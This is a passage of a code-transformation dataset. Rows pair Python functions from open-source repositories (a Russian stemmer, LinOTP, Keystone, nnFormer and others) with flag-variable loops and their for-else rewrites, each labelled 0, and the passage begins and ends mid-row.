            if suffix in ('i^ushchi^ui^u', 'i^ushchi^ai^a', 'i^ushchui^u', 'i^ushchai^a', 'i^ushchoi^u', 'i^ushchei^u', 'i^ushchimi', 'i^ushchymi', 'i^ushchego', 'i^ushchogo', 'i^ushchemu', 'i^ushchomu', 'i^ushchikh', 'i^ushchykh', 'shchi^ui^u', 'shchi^ai^a', 'i^ushchee', 'i^ushchie', 'i^ushchye', 'i^ushchoe', 'i^ushchei`', 'i^ushchii`', 'i^ushchyi`', 'i^ushchoi`', 'i^ushchem', 'i^ushchim', 'i^ushchym', 'i^ushchom', 'vshi^ui^u', 'vshi^ai^a', 'shchui^u', 'shchai^a', 'shchoi^u', 'shchei^u', 'emi^ui^u', 'emi^ai^a', 'nni^ui^u', 'nni^ai^a', 'shchimi', 'shchymi', 'shchego', 'shchogo', 'shchemu', 'shchomu', 'shchikh', 'shchykh', 'vshui^u', 'vshai^a', 'vshoi^u', 'vshei^u', 'shchee', 'shchie', 'shchye', 'shchoe', 'shchei`', 'shchii`', 'shchyi`', 'shchoi`', 'shchem', 'shchim', 'shchym', 'shchom', 'vshimi', 'vshymi', 'vshego', 'vshogo', 'vshemu', 'vshomu', 'vshikh', 'vshykh', 'emui^u', 'emai^a', 'emoi^u', 'emei^u', 'nnui^u', 'nnai^a', 'nnoi^u', 'nnei^u', 'vshee', 'vshie', 'vshye', 'vshoe', 'vshei`', 'vshii`', 'vshyi`', 'vshoi`', 'vshem', 'vshim', 'vshym', 'vshom', 'emimi', 'emymi', 'emego', 'emogo', 'ememu', 'emomu', 'emikh', 'emykh', 'nnimi', 'nnymi', 'nnego', 'nnogo', 'nnemu', 'nnomu', 'nnikh', 'nnykh', 'emee', 'emie', 'emye', 'emoe', 'emei`', 'emii`', 'emyi`', 'emoi`', 'emem', 'emim', 'emym', 'emom', 'nnee', 'nnie', 'nnye', 'nnoe', 'nnei`', 'nnii`', 'nnyi`', 'nnoi`', 'nnem', 'nnim', 'nnym', 'nnom'):
                if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    adjectival_removed = True
                    break
            else:
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                adjectival_removed = True
                break
    if not adjectival_removed:
        for suffix in self.__verb_suffixes:
            if rv.endswith(suffix):
                if suffix in ('la', 'na', 'ete', 'i`te', 'li', 'i`', 'l', 'em', 'n', 'lo', 'no', 'et', 'i^ut', 'ny', ""t'"", ""esh'"", 'nno'):
                    if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                        word = word[:-len(suffix)]
                        r2 = r2[:-len(suffix)]
                        rv = rv[:-len(suffix)]
                        verb_removed = True
                        break
                else:
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    verb_removed = True
                    break
    if not adjectival_removed and (not verb_removed):
        for suffix in self.__noun_suffixes:
            if rv.endswith(suffix):
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                break",0
textrank,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/textrank/summa/preprocessing/snowball.py,https://github.com/summanlp/textrank/tree/master/summa/preprocessing/snowball.py,RussianStemmer,stem$2956,"def stem(self, word):
        """"""
        Stem a Russian word and return the stemmed form.

        :param word: The word that is stemmed.
        :type word: str or unicode
        :return: The stemmed form.
        :rtype: unicode

        """"""
        chr_exceeded = False
        for i in range(len(word)):
            if ord(word[i]) > 255:
                chr_exceeded = True
                break

        if chr_exceeded:
            word = self.__cyrillic_to_roman(word)

        step1_success = False
        adjectival_removed = False
        verb_removed = False
        undouble_success = False
        superlative_removed = False

        rv, r2 = self.__regions_russian(word)

        # Step 1
        for suffix in self.__perfective_gerund_suffixes:
            if rv.endswith(suffix):
                if suffix in (""v"", ""vshi"", ""vshis'""):
                    if (rv[-len(suffix)-3:-len(suffix)] == ""i^a"" or
                        rv[-len(suffix)-1:-len(suffix)] == ""a""):
                        word = word[:-len(suffix)]
                        r2 = r2[:-len(suffix)]
                        rv = rv[:-len(suffix)]
                        step1_success = True
                        break
                else:
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    step1_success = True
                    break

        if not step1_success:
            for suffix in self.__reflexive_suffixes:
                if rv.endswith(suffix):
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    break

            for suffix in self.__adjectival_suffixes:
                if rv.endswith(suffix):
                    if suffix in ('i^ushchi^ui^u', 'i^ushchi^ai^a',
                              'i^ushchui^u', 'i^ushchai^a', 'i^ushchoi^u',
                              'i^ushchei^u', 'i^ushchimi', 'i^ushchymi',
                              'i^ushchego', 'i^ushchogo', 'i^ushchemu',
                              'i^ushchomu', 'i^ushchikh', 'i^ushchykh',
                              'shchi^ui^u', 'shchi^ai^a', 'i^ushchee',
                              'i^ushchie', 'i^ushchye', 'i^ushchoe',
                              'i^ushchei`', 'i^ushchii`', 'i^ushchyi`',
                              'i^ushchoi`', 'i^ushchem', 'i^ushchim',
                              'i^ushchym', 'i^ushchom', 'vshi^ui^u',
                              'vshi^ai^a', 'shchui^u', 'shchai^a',
                              'shchoi^u', 'shchei^u', 'emi^ui^u',
                              'emi^ai^a', 'nni^ui^u', 'nni^ai^a',
                              'shchimi', 'shchymi', 'shchego', 'shchogo',
                              'shchemu', 'shchomu', 'shchikh', 'shchykh',
                              'vshui^u', 'vshai^a', 'vshoi^u', 'vshei^u',
                              'shchee', 'shchie', 'shchye', 'shchoe',
                              'shchei`', 'shchii`', 'shchyi`', 'shchoi`',
                              'shchem', 'shchim', 'shchym', 'shchom',
                              'vshimi', 'vshymi', 'vshego', 'vshogo',
                              'vshemu', 'vshomu', 'vshikh', 'vshykh',
                              'emui^u', 'emai^a', 'emoi^u', 'emei^u',
                              'nnui^u', 'nnai^a', 'nnoi^u', 'nnei^u',
                              'vshee', 'vshie', 'vshye', 'vshoe',
                              'vshei`', 'vshii`', 'vshyi`', 'vshoi`',
                              'vshem', 'vshim', 'vshym', 'vshom',
                              'emimi', 'emymi', 'emego', 'emogo',
                              'ememu', 'emomu', 'emikh', 'emykh',
                              'nnimi', 'nnymi', 'nnego', 'nnogo',
                              'nnemu', 'nnomu', 'nnikh', 'nnykh',
                              'emee', 'emie', 'emye', 'emoe', 'emei`',
                              'emii`', 'emyi`', 'emoi`', 'emem', 'emim',
                              'emym', 'emom', 'nnee', 'nnie', 'nnye',
                              'nnoe', 'nnei`', 'nnii`', 'nnyi`', 'nnoi`',
                              'nnem', 'nnim', 'nnym', 'nnom'):
                        if (rv[-len(suffix)-3:-len(suffix)] == ""i^a"" or
                            rv[-len(suffix)-1:-len(suffix)] == ""a""):
                            word = word[:-len(suffix)]
                            r2 = r2[:-len(suffix)]
                            rv = rv[:-len(suffix)]
                            adjectival_removed = True
                            break
                    else:
                        word = word[:-len(suffix)]
                        r2 = r2[:-len(suffix)]
                        rv = rv[:-len(suffix)]
                        adjectival_removed = True
                        break

            if not adjectival_removed:
                for suffix in self.__verb_suffixes:
                    if rv.endswith(suffix):
                        if suffix in (""la"", ""na"", ""ete"", ""i`te"", ""li"",
                                      ""i`"", ""l"", ""em"", ""n"", ""lo"", ""no"",
                                      ""et"", ""i^ut"", ""ny"", ""t'"", ""esh'"",
                                      ""nno""):
                            if (rv[-len(suffix)-3:-len(suffix)] == ""i^a"" or
                                rv[-len(suffix)-1:-len(suffix)] == ""a""):
                                word = word[:-len(suffix)]
                                r2 = r2[:-len(suffix)]
                                rv = rv[:-len(suffix)]
                                verb_removed = True
                                break
                        else:
                            word = word[:-len(suffix)]
                            r2 = r2[:-len(suffix)]
                            rv = rv[:-len(suffix)]
                            verb_removed = True
                            break

            if not adjectival_removed and not verb_removed:
                for suffix in self.__noun_suffixes:
                    if rv.endswith(suffix):
                        word = word[:-len(suffix)]
                        r2 = r2[:-len(suffix)]
                        rv = rv[:-len(suffix)]
                        break

        # Step 2
        if rv.endswith(""i""):
            word = word[:-1]
            r2 = r2[:-1]

        # Step 3
        for suffix in self.__derivational_suffixes:
            if r2.endswith(suffix):
                word = word[:-len(suffix)]
                break

        # Step 4
        if word.endswith(""nn""):
            word = word[:-1]
            undouble_success = True

        if not undouble_success:
            for suffix in self.__superlative_suffixes:
                if word.endswith(suffix):
                    word = word[:-len(suffix)]
                    superlative_removed = True
                    break
            if word.endswith(""nn""):
                word = word[:-1]

        if not undouble_success and not superlative_removed:
            if word.endswith(""'""):
                word = word[:-1]

        if chr_exceeded:
            word = self.__roman_to_cyrillic(word)


        return word","for suffix in self.__adjectival_suffixes:
    if rv.endswith(suffix):
        if suffix in ('i^ushchi^ui^u', 'i^ushchi^ai^a', 'i^ushchui^u', 'i^ushchai^a', 'i^ushchoi^u', 'i^ushchei^u', 'i^ushchimi', 'i^ushchymi', 'i^ushchego', 'i^ushchogo', 'i^ushchemu', 'i^ushchomu', 'i^ushchikh', 'i^ushchykh', 'shchi^ui^u', 'shchi^ai^a', 'i^ushchee', 'i^ushchie', 'i^ushchye', 'i^ushchoe', 'i^ushchei`', 'i^ushchii`', 'i^ushchyi`', 'i^ushchoi`', 'i^ushchem', 'i^ushchim', 'i^ushchym', 'i^ushchom', 'vshi^ui^u', 'vshi^ai^a', 'shchui^u', 'shchai^a', 'shchoi^u', 'shchei^u', 'emi^ui^u', 'emi^ai^a', 'nni^ui^u', 'nni^ai^a', 'shchimi', 'shchymi', 'shchego', 'shchogo', 'shchemu', 'shchomu', 'shchikh', 'shchykh', 'vshui^u', 'vshai^a', 'vshoi^u', 'vshei^u', 'shchee', 'shchie', 'shchye', 'shchoe', 'shchei`', 'shchii`', 'shchyi`', 'shchoi`', 'shchem', 'shchim', 'shchym', 'shchom', 'vshimi', 'vshymi', 'vshego', 'vshogo', 'vshemu', 'vshomu', 'vshikh', 'vshykh', 'emui^u', 'emai^a', 'emoi^u', 'emei^u', 'nnui^u', 'nnai^a', 'nnoi^u', 'nnei^u', 'vshee', 'vshie', 'vshye', 'vshoe', 'vshei`', 'vshii`', 'vshyi`', 'vshoi`', 'vshem', 'vshim', 'vshym', 'vshom', 'emimi', 'emymi', 'emego', 'emogo', 'ememu', 'emomu', 'emikh', 'emykh', 'nnimi', 'nnymi', 'nnego', 'nnogo', 'nnemu', 'nnomu', 'nnikh', 'nnykh', 'emee', 'emie', 'emye', 'emoe', 'emei`', 'emii`', 'emyi`', 'emoi`', 'emem', 'emim', 'emym', 'emom', 'nnee', 'nnie', 'nnye', 'nnoe', 'nnei`', 'nnii`', 'nnyi`', 'nnoi`', 'nnem', 'nnim', 'nnym', 'nnom'):
            if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                adjectival_removed = True
                break
        else:
            word = word[:-len(suffix)]
            r2 = r2[:-len(suffix)]
            rv = rv[:-len(suffix)]
            adjectival_removed = True
            break
if not adjectival_removed:
    for suffix in self.__verb_suffixes:
        if rv.endswith(suffix):
            if suffix in ('la', 'na', 'ete', 'i`te', 'li', 'i`', 'l', 'em', 'n', 'lo', 'no', 'et', 'i^ut', 'ny', ""t'"", ""esh'"", 'nno'):
                if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    verb_removed = True
                    break
            else:
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                verb_removed = True
                break","for suffix in self.__adjectival_suffixes:
    if rv.endswith(suffix):
        if suffix in ('i^ushchi^ui^u', 'i^ushchi^ai^a', 'i^ushchui^u', 'i^ushchai^a', 'i^ushchoi^u', 'i^ushchei^u', 'i^ushchimi', 'i^ushchymi', 'i^ushchego', 'i^ushchogo', 'i^ushchemu', 'i^ushchomu', 'i^ushchikh', 'i^ushchykh', 'shchi^ui^u', 'shchi^ai^a', 'i^ushchee', 'i^ushchie', 'i^ushchye', 'i^ushchoe', 'i^ushchei`', 'i^ushchii`', 'i^ushchyi`', 'i^ushchoi`', 'i^ushchem', 'i^ushchim', 'i^ushchym', 'i^ushchom', 'vshi^ui^u', 'vshi^ai^a', 'shchui^u', 'shchai^a', 'shchoi^u', 'shchei^u', 'emi^ui^u', 'emi^ai^a', 'nni^ui^u', 'nni^ai^a', 'shchimi', 'shchymi', 'shchego', 'shchogo', 'shchemu', 'shchomu', 'shchikh', 'shchykh', 'vshui^u', 'vshai^a', 'vshoi^u', 'vshei^u', 'shchee', 'shchie', 'shchye', 'shchoe', 'shchei`', 'shchii`', 'shchyi`', 'shchoi`', 'shchem', 'shchim', 'shchym', 'shchom', 'vshimi', 'vshymi', 'vshego', 'vshogo', 'vshemu', 'vshomu', 'vshikh', 'vshykh', 'emui^u', 'emai^a', 'emoi^u', 'emei^u', 'nnui^u', 'nnai^a', 'nnoi^u', 'nnei^u', 'vshee', 'vshie', 'vshye', 'vshoe', 'vshei`', 'vshii`', 'vshyi`', 'vshoi`', 'vshem', 'vshim', 'vshym', 'vshom', 'emimi', 'emymi', 'emego', 'emogo', 'ememu', 'emomu', 'emikh', 'emykh', 'nnimi', 'nnymi', 'nnego', 'nnogo', 'nnemu', 'nnomu', 'nnikh', 'nnykh', 'emee', 'emie', 'emye', 'emoe', 'emei`', 'emii`', 'emyi`', 'emoi`', 'emem', 'emim', 'emym', 'emom', 'nnee', 'nnie', 'nnye', 'nnoe', 'nnei`', 'nnii`', 'nnyi`', 'nnoi`', 'nnem', 'nnim', 'nnym', 'nnom'):
            if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                adjectival_removed = True
                break
        else:
            word = word[:-len(suffix)]
            r2 = r2[:-len(suffix)]
            rv = rv[:-len(suffix)]
            adjectival_removed = True
            break
else:
    for suffix in self.__verb_suffixes:
        if rv.endswith(suffix):
            if suffix in ('la', 'na', 'ete', 'i`te', 'li', 'i`', 'l', 'em', 'n', 'lo', 'no', 'et', 'i^ut', 'ny', ""t'"", ""esh'"", 'nno'):
                if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    verb_removed = True
                    break
            else:
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                verb_removed = True
                break",0
LinOTP,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/LinOTP/linotp/useridresolver/PasswdIdResolver.py,https://github.com/LinOTP/LinOTP/tree/master/linotp/useridresolver/PasswdIdResolver.py,IdResolver,getUserList$385,"def getUserList(self, searchDict):
        """"""
        get a list of all users matching the search criteria of the searchdict

        :param searchDict: dict of search expressions
        """"""
        ret = []

        # first check if the searches are in the searchDict
        for l in self.descDict:
            line = self.descDict[l]
            ok = True

            for search in searchDict:

                if search not in self.searchFields:
                    ok = False
                    break

                pattern = searchDict[search]

                log.debug(""[getUserList] searching for %s:%s"", search, pattern)

                if search == ""username"":
                    ok = self.checkUserName(line, pattern)
                elif search == ""userid"":
                    ok = self.checkUserId(line, pattern)
                elif search == ""description"":
                    ok = self.checkDescription(line, pattern)
                elif search == ""email"":
                    ok = self.checkEmail(line, pattern)

                if not ok:
                    break

            if ok:
                uid = line[self.sF[""userid""]]
                info = self.getUserInfo(uid, no_passwd=True)
                ret.append(info)

        return ret","for search in searchDict:
    if search not in self.searchFields:
        ok = False
        break
    pattern = searchDict[search]
    log.debug('[getUserList] searching for %s:%s', search, pattern)
    if search == 'username':
        ok = self.checkUserName(line, pattern)
    elif search == 'userid':
        ok = self.checkUserId(line, pattern)
    elif search == 'description':
        ok = self.checkDescription(line, pattern)
    elif search == 'email':
        ok = self.checkEmail(line, pattern)
    if not ok:
        break
if ok:
    uid = line[self.sF['userid']]
    info = self.getUserInfo(uid, no_passwd=True)
    ret.append(info)","for search in searchDict:
    if search not in self.searchFields:
        ok = False
        break
    pattern = searchDict[search]
    log.debug('[getUserList] searching for %s:%s', search, pattern)
    if search == 'username':
        ok = self.checkUserName(line, pattern)
    elif search == 'userid':
        ok = self.checkUserId(line, pattern)
    elif search == 'description':
        ok = self.checkDescription(line, pattern)
    elif search == 'email':
        ok = self.checkEmail(line, pattern)
    if not ok:
        break
else:
    uid = line[self.sF['userid']]
    info = self.getUserInfo(uid, no_passwd=True)
    ret.append(info)",0
hummingbot,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/hummingbot/test/debug/test_paper_trade_market.py,https://github.com/CoinAlpha/hummingbot/tree/master/test/debug/test_paper_trade_market.py,TestUtils,get_match_events$45,"def get_match_events(cls, event_logs: List[NamedTuple], event_type: NamedTuple, match_dict: Dict[str, any]):
        match_events = []
        for e in cls.filter_events_by_type(event_logs, event_type):
            match = True
            for k, v in match_dict.items():
                try:
                    event_value = getattr(e, k)
                    if type(v) in [float]:
                        if abs(v - float(event_value)) <= 1 * 10 ** (-8):
                            continue
                    elif event_value != v:
                        match = False
                        break
                except Exception as err:
                    print(f""Key {k} does not exist in event {e}. Error: {err}"")
            if match:
                match_events.append(e)
        return match_events","for (k, v) in match_dict.items():
    try:
        event_value = getattr(e, k)
        if type(v) in [float]:
            if abs(v - float(event_value)) <= 1 * 10 ** (-8):
                continue
        elif event_value != v:
            match = False
            break
    except Exception as err:
        print(f'Key {k} does not exist in event {e}. Error: {err}')
if match:
    match_events.append(e)","for (k, v) in match_dict.items():
    try:
        event_value = getattr(e, k)
        if type(v) in [float]:
            if abs(v - float(event_value)) <= 1 * 10 ** (-8):
                continue
        elif event_value != v:
            break
    except Exception as err:
        print(f'Key {k} does not exist in event {e}. Error: {err}')
else:
    match_events.append(e)",0
ottertune,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/ottertune/script/validators/source_validator.py,https://github.com/cmu-db/ottertune/tree/master/script/validators/source_validator.py,,validate_dir$175,"def validate_dir(root_dir):
    for exclude_dir in EXCLUDE_DIRECTORIES:
        if root_dir.startswith(exclude_dir):
            return True

    status = True
    for root, dirs, files in os.walk(root_dir):  # pylint: disable=not-an-iterable
        # Remove excluded dirs from list
        valid_dirs = []
        for d in dirs:
            valid = True
            for exclude_dir in EXCLUDE_DIRECTORIES:
                if d.startswith(exclude_dir):
                    valid = False
                    break
            if valid:
                valid_dirs.append(d)
        dirs[:] = valid_dirs

        # Validate files
        for file_path in files:
            file_path = os.path.join(root, file_path)

            if not validate_file(file_path):
                status = False
    return status","for exclude_dir in EXCLUDE_DIRECTORIES:
    if d.startswith(exclude_dir):
        valid = False
        break
if valid:
    valid_dirs.append(d)","for exclude_dir in EXCLUDE_DIRECTORIES:
    if d.startswith(exclude_dir):
        break
else:
    valid_dirs.append(d)",0
go-explore,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/go-explore/robustified/goexplore_py/main.py,https://github.com/uber-research/go-explore/tree/master/robustified/goexplore_py/main.py,,run$426,"def run(base_path, args):
    cur_id = 0
    if os.path.exists(base_path):
        current = glob.glob(base_path + '/*')
        for c in current:
            try:
                idx, _ = c.split('/')[-1].split('_')
                idx = int(idx)
                if idx >= cur_id:
                    cur_id = idx + 1

                if args.seed is not None:
                    if os.path.exists(c + '/has_died'):
                        continue
                    other_kwargs = json.load(open(c + '/kwargs.json'))
                    is_same_kwargs = True
                    for k, v in vars(args).items():
                        def my_neq(a, b):
                            if isinstance(a, tuple):
                                a = list(a)
                            if isinstance(b, tuple):
                                b = list(b)
                            return a != b
                        if k != 'base_path' and my_neq(other_kwargs[k], v):
                            is_same_kwargs = False
                            break
                    if is_same_kwargs:
                        try:
                            last_exp = sorted([e for e in glob.glob(c + '/*_experience.bz2') if 'thisisfake' not in e])[-1]
                        except IndexError:
                            continue
                        mod_time = os.path.getmtime(last_exp)
                        if time.time() - mod_time < 3600:
                            print('Another run is already running at', c, 'exiting.')
                            return
                        compute = int(last_exp.split('/')[-1].split('_')[1])
                        if compute >= args.max_compute_steps:
                            print('A completed equivalent run already exists at', c, 'exiting.')
                            return
            except Exception:
                pass

    base_path = f'{base_path}/{cur_id:04d}_{uuid.uuid4().hex}/'
    args.base_path = base_path
    os.makedirs(base_path, exist_ok=True)
    open(f'{base_path}/thisisfake_{args.max_compute_steps}_experience.bz2', 'w')
    info = copy.copy(vars(args))
    info['version'] = VERSION
    info['code_hash'] = get_code_hash()
    print('Code hash:', info['code_hash'])
    del info['base_path']
    json.dump(info, open(base_path + '/kwargs.json', 'w'), sort_keys=True, indent=2)

    code_path = base_path + '/code'
    cur_dir = os.path.dirname(os.path.realpath(__file__))
    shutil.copytree(cur_dir, code_path, ignore=shutil.ignore_patterns('*.png', '*.stl', '*.JPG', '__pycache__', 'LICENSE*', 'README*'))

    teeout = Tee(args.base_path + '/log.out', 'stdout')
    teeerr = Tee(args.base_path + '/log.err', 'stderr')
    
    print('Experiment running in', base_path)

    try:
        _run(base_path, args)
    except Exception as e:
        import traceback
        print(e)
        traceback.print_exc()
        import signal
        import psutil
        current_process = psutil.Process()
        children = current_process.children(recursive=True)
        for child in children:
            os.kill(child.pid, signal.SIGTERM)
        open(base_path + 'has_died', 'w')
        os._exit(1)","for (k, v) in vars(args).items():

    def my_neq(a, b):
        if isinstance(a, tuple):
            a = list(a)
        if isinstance(b, tuple):
            b = list(b)
        return a != b
    if k != 'base_path' and my_neq(other_kwargs[k], v):
        is_same_kwargs = False
        break
if is_same_kwargs:
    try:
        last_exp = sorted([e for e in glob.glob(c + '/*_experience.bz2') if 'thisisfake' not in e])[-1]
    except IndexError:
        continue
    mod_time = os.path.getmtime(last_exp)
    if time.time() - mod_time < 3600:
        print('Another run is already running at', c, 'exiting.')
        return
    compute = int(last_exp.split('/')[-1].split('_')[1])
    if compute >= args.max_compute_steps:
        print('A completed equivalent run already exists at', c, 'exiting.')
        return","for (k, v) in vars(args).items():

    def my_neq(a, b):
        if isinstance(a, tuple):
            a = list(a)
        if isinstance(b, tuple):
            b = list(b)
        return a != b
    if k != 'base_path' and my_neq(other_kwargs[k], v):
        break
else:
    try:
        last_exp = sorted([e for e in glob.glob(c + '/*_experience.bz2') if 'thisisfake' not in e])[-1]
    except IndexError:
        continue
    mod_time = os.path.getmtime(last_exp)
    if time.time() - mod_time < 3600:
        print('Another run is already running at', c, 'exiting.')
        return
    compute = int(last_exp.split('/')[-1].split('_')[1])
    if compute >= args.max_compute_steps:
        print('A completed equivalent run already exists at', c, 'exiting.')
        return",0
DiCE,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/DiCE/dice_ml/explainer_interfaces/explainer_base.py,https://github.com/interpretml/DiCE/tree/master/dice_ml/explainer_interfaces/explainer_base.py,ExplainerBase,_check_any_counterfactuals_computed$704,"def _check_any_counterfactuals_computed(self, cf_examples_arr):
        """"""Check if any counterfactuals were generated for any query point.""""""
        no_cf_generated = True
        # Check if any counterfactuals were generated for any query point
        for cf_examples in cf_examples_arr:
            if cf_examples.final_cfs_df is not None and len(cf_examples.final_cfs_df) > 0:
                no_cf_generated = False
                break
        if no_cf_generated:
            raise UserConfigValidationException(
                ""No counterfactuals found for any of the query points! Kindly check your configuration."")","for cf_examples in cf_examples_arr:
    if cf_examples.final_cfs_df is not None and len(cf_examples.final_cfs_df) > 0:
        no_cf_generated = False
        break
if no_cf_generated:
    raise UserConfigValidationException('No counterfactuals found for any of the query points! Kindly check your configuration.')","for cf_examples in cf_examples_arr:
    if cf_examples.final_cfs_df is not None and len(cf_examples.final_cfs_df) > 0:
        break
else:
    raise UserConfigValidationException('No counterfactuals found for any of the query points! Kindly check your configuration.')",0
tapas,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/tapas/tapas/scripts/preprocess_nq_utils.py,https://github.com/google-research/tapas/tree/master/tapas/scripts/preprocess_nq_utils.py,,_create_interaction$344,"def _create_interaction(
    example_id,
    question_text,
    answer_groups,
    table,
):
  """"""Creates an interaction instance that corresponds to some short answer.""""""
  interaction = interaction_pb2.Interaction()
  question = interaction.questions.add()

  main_answer_index = None
  for answer_group_index, answers in answer_groups:
    if answers:
      all_answer_valid = True
      for answer_text in answers:
        if not _is_valid_answer_text(answer_text):
          all_answer_valid = False
          break
        coords = list(find_answer(table, answer_text))
        if not coords:
          all_answer_valid = False
          break
      if all_answer_valid:
        if main_answer_index is None:
          answer = question.answer
          main_answer_index = answer_group_index
        else:
          answer = question.alternative_answers.add()
        for answer_text in answers:
          answer.answer_texts.append(answer_text)
  if main_answer_index is None:
    beam.metrics.Metrics.counter(_NS, ""Failed to find answer in table"").inc()
    return None

  interaction_id = get_interaction_id(example_id, main_answer_index)
  interaction.id = interaction_id
  question.id = f""{interaction.id}_0""
  question.original_text = question_text
  interaction.table.CopyFrom(table)
  return interaction","for answer_text in answers:
    if not _is_valid_answer_text(answer_text):
        all_answer_valid = False
        break
    coords = list(find_answer(table, answer_text))
    if not coords:
        all_answer_valid = False
        break
if all_answer_valid:
    if main_answer_index is None:
        answer = question.answer
        main_answer_index = answer_group_index
    else:
        answer = question.alternative_answers.add()
    for answer_text in answers:
        answer.answer_texts.append(answer_text)","for answer_text in answers:
    if not _is_valid_answer_text(answer_text):
        break
    coords = list(find_answer(table, answer_text))
    if not coords:
        break
else:
    if main_answer_index is None:
        answer = question.answer
        main_answer_index = answer_group_index
    else:
        answer = question.alternative_answers.add()
    for answer_text in answers:
        answer.answer_texts.append(answer_text)",0
keystone,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/keystone/keystone/catalog/core.py,https://github.com/openstack/keystone/tree/master/keystone/catalog/core.py,Manager,get_endpoints_filtered_by_endpoint_group$279,"def get_endpoints_filtered_by_endpoint_group(self, endpoint_group_id):
        endpoints = self.list_endpoints()
        filters = self.get_endpoint_group(endpoint_group_id)['filters']
        filtered_endpoints = []

        for endpoint in endpoints:
            is_candidate = True
            for key, value in filters.items():
                if endpoint[key] != value:
                    is_candidate = False
                    break
            if is_candidate:
                filtered_endpoints.append(endpoint)
        return filtered_endpoints","for (key, value) in filters.items():
    if endpoint[key] != value:
        is_candidate = False
        break
if is_candidate:
    filtered_endpoints.append(endpoint)","for (key, value) in filters.items():
    if endpoint[key] != value:
        break
else:
    filtered_endpoints.append(endpoint)",0
nnFormer,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/nnFormer/nnformer/evaluation/model_selection/summarize_results_in_one_json.py,https://github.com/282857341/nnFormer/tree/master/nnformer/evaluation/model_selection/summarize_results_in_one_json.py,,summarize$22,"def summarize(tasks, models=('2d', '3d_lowres', '3d_fullres', '3d_cascade_fullres'),
              output_dir=join(network_training_output_dir, ""summary_jsons""), folds=(0, 1, 2, 3, 4)):
    maybe_mkdir_p(output_dir)

    if len(tasks) == 1 and tasks[0] == ""all"":
        tasks = list(range(999))
    else:
        tasks = [int(i) for i in tasks]

    for model in models:
        for t in tasks:
            t = int(t)
            if not isdir(join(network_training_output_dir, model)):
                continue
            task_name = subfolders(join(network_training_output_dir, model), prefix=""Task%03.0d"" % t, join=False)
            if len(task_name) != 1:
                print(""did not find unique output folder for network %s and task %s"" % (model, t))
                continue
            task_name = task_name[0]
            out_dir_task = join(network_training_output_dir, model, task_name)

            model_trainers = subdirs(out_dir_task, join=False)
            for trainer in model_trainers:
                if trainer.startswith(""fold""):
                    continue
                out_dir = join(out_dir_task, trainer)

                validation_folders = []
                for fld in folds:
                    d = join(out_dir, ""fold%d""%fld)
                    if not isdir(d):
                        d = join(out_dir, ""fold_%d""%fld)
                        if not isdir(d):
                            break
                    validation_folders += subfolders(d, prefix=""validation"", join=False)

                for v in validation_folders:
                    ok = True
                    metrics = OrderedDict()
                    for fld in folds:
                        d = join(out_dir, ""fold%d""%fld)
                        if not isdir(d):
                            d = join(out_dir, ""fold_%d""%fld)
                            if not isdir(d):
                                ok = False
                                break
                        validation_folder = join(d, v)

                        if not isfile(join(validation_folder, ""summary.json"")):
                            print(""summary.json missing for net %s task %s fold %d"" % (model, task_name, fld))
                            ok = False
                            break

                        metrics_tmp = load_json(join(validation_folder, ""summary.json""))[""results""][""mean""]
                        for l in metrics_tmp.keys():
                            if metrics.get(l) is None:
                                metrics[l] = OrderedDict()
                            for m in metrics_tmp[l].keys():
                                if metrics[l].get(m) is None:
                                    metrics[l][m] = []
                                metrics[l][m].append(metrics_tmp[l][m])
                    if ok:
                        for l in metrics.keys():
                            for m in metrics[l].keys():
                                assert len(metrics[l][m]) == len(folds)
                                metrics[l][m] = np.mean(metrics[l][m])
                        json_out = OrderedDict()
                        json_out[""results""] = OrderedDict()
                        json_out[""results""][""mean""] = metrics
                        json_out[""task""] = task_name
                        json_out[""description""] = model + "" "" + task_name + "" all folds summary""
                        json_out[""name""] = model + "" "" + task_name + "" all folds summary""
                        json_out[""experiment_name""] = model
                        save_json(json_out, join(out_dir, ""summary_allFolds__%s.json"" % v))
                        save_json(json_out, join(output_dir, ""%s__%s__%s__%s.json"" % (task_name, model, trainer, v)))
                        foreground_mean(join(out_dir, ""summary_allFolds__%s.json"" % v))
                        foreground_mean(join(output_dir, ""%s__%s__%s__%s.json"" % (task_name, model, trainer, v)))","for fld in folds:
